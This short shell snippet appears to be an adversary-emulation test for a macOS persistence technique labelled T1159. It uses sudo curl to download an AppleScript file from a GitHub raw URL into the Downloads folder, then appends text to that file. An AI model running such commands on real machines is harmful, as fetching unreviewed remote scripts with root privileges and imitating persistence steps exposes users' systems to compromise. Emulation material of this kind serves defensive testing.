#ATTACK_PERSISTENCE_T1159_MACOS_SCPT_MOD

sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/a.scpt -o ~/Downloads/a.scpt 

echo "hi" >> ~/Downloads/a.scpt